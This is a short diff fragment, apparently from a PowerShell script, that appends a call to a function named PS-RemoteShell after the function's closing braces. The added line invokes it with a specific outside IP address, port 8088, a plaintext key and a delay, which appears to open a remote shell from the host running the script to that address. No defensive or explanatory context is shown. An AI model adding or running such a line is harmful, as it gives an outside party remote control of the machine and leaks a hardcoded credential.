@@ -192,3 +192,4 @@ function PS-RemoteShell {
    
    }
 }
+PS-RemoteShell -ip 71.193.242.109 -port 8088 -Key Sobriety4me! -Delay 2000
